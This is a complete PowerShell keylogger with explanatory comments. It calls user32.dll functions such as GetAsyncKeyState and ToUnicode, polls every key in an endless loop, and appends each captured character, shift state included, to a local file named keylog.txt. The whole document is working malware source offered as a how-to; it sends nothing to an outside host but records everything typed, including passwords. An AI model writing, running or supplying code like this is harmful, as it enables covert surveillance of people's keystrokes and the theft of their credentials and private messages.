# Powershell alone cannot keylog, but we can
# use functions within user32.dll with powershell
# to keylog.

# The functions we will be needing to perform key
# logging are:
# 
# 1. GetAsyncKeyState - Will tell us the state of a key.
# 2. GetKeyboardState - Will tell us what key was pressed.
# 3. MapVirtualKey    - Will map a scan code to key code.
# 4. ToUnicode        - Will map a key code to unicode.

Add-Type @"
using System.Runtime.InteropServices;

public class WinKeyLog
{
    [DllImport("user32.dll")] 
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll")]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
"@

# There are many ways to record what keys were
# pressed, but we will save them to a file.

New-Item "keylog.txt" > $null 2>&1
$KeyLogFile                             = Resolve-Path "keylog.txt"

# Now the 4 things we want to accomplish are:
# 
# 1. Scan every key on the keyboard, and ask if
#    it had been pressed.
# 
# 2. If it had been pressed, translate the scan
#    code into a key code.
# 
# 3. Because key codes are nothing like ascii
#    we need a function to tell us exactly what
#    key was pressed. That function requires the
#    state if the keyboard 
#
# 4. Take the key code, and turn it into ascii,
#    then append this to a file.

while (1)
{
    Sleep -Milliseconds 40

    # Iterate over every virual key code, if the
    # state of the key is down (-32767), then
    # prepare to write code.

    foreach ($KeyCode in 9..254)
    {
        $KeyState                       = [WinKeyLog]::GetAsyncKeyState($KeyCode)

        if ($KeyState -eq -32767)
        {
            # Now given the virual key code, get
            # the scan code, and the state of the
            # keyboard.

            $ScanCode                   = [WinKeyLog]::MapVirtualKey($KeyCode, 0)
            $KeyboardState              = [Byte[]]::New(256)
            $Result                     = [WinKeyLog]::GetKeyboardState($KeyboardState)

            # Because GetKeyboardState does NOT
            # account for shift being held at
            # this moment, we manually check if
            # it is, then set the bytes in the
            # keyboard state to reflect as such.

            $ShiftPressed               = ([WinKeyLog]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0

            if ($ShiftPressed)
            {
                $KeyboardState[0x10]    = 0x80
                $KeyboardState[0xA0]    = 0x80
                $KeyboardState[0xA1]    = 0x80
            }

            # Prepare a character writing buffer
            # to write the current character
            # translated to unicode to, translate
            # the key to unicode, then write the
            # character to a file.

            $CurrentChracter          = [Text.StringBuilder]::New()

            [WinKeyLog]::ToUnicode($KeyCode, $ScanCode, $KeyboardState, $CurrentChracter, $CurrentChracter.Capacity, 0) > $null
            [IO.File]::AppendAllText($KeyLogFile, $CurrentChracter, [Text.Encoding]::Unicode) 
        }
    }
}
